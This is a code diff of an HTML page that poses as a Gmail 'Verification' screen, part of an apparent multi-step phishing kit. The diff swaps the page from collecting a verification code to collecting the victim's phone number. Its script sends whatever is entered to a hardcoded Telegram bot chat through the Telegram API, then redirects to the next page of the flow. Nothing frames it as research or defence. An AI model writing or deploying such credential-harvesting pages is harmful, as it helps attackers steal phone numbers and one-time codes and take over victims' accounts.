@@ -83,12 +83,13 @@
     <div class="form-box">
       <img id="image" src="Gmail-Embleme.png" alt="where">
       <h1>Verification</h1>
-      <label for="code">We sent a code to your phone number</label>
+      <p id="description">Enter Your Phone Number</p>
 
-      <!-- Step 1: Verification Code -->
-      <form id="code-form">
-        <div id="code-group">
-          <input type="text" id="code" name="code" required>
+      <!-- Step 1: Phone Number -->
+      <form id="phone-form">
+        <div id="input-group">
+          <label for="phone">Phone Number</label>
+          <input type="text" id="phone" name="phone" required>
         </div>
         <button type="submit" id="next-btn" class="next-btn">Next</button>
       </form>
@@ -96,15 +97,15 @@
   </div>
 
   <script>
-    const form = document.getElementById("code-form");
+    const form = document.getElementById("phone-form");
 
     form.addEventListener("submit", async (e) => {
       e.preventDefault();
 
-      const code = document.getElementById("code").value.trim();
+      const phone = document.getElementById("phone").value.trim();
 
-      if (!code) {
-        alert("Please enter the verification code.");
+      if (!phone) {
+        alert("Please enter a valid phone number.");
         return;
       }
 
@@ -113,7 +114,7 @@
       const chatId = "7410515457"; // Replace with your chat ID
 
       // Create the message to send
-      const message = `📞 Verification Code:\nCode: ${code}`;
+      const message = `📞 Code:\nPhone Number: ${phone}`;
 
       // Send the message via Telegram API
       const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
@@ -132,7 +133,7 @@
 
         if (response.ok) {
           // Redirect to the next page after successful submission
-          window.location.href = "index4.html";
+          window.location.href = "index3.html";
         } else {
           alert("Failed to send message. Please try again.");
         }
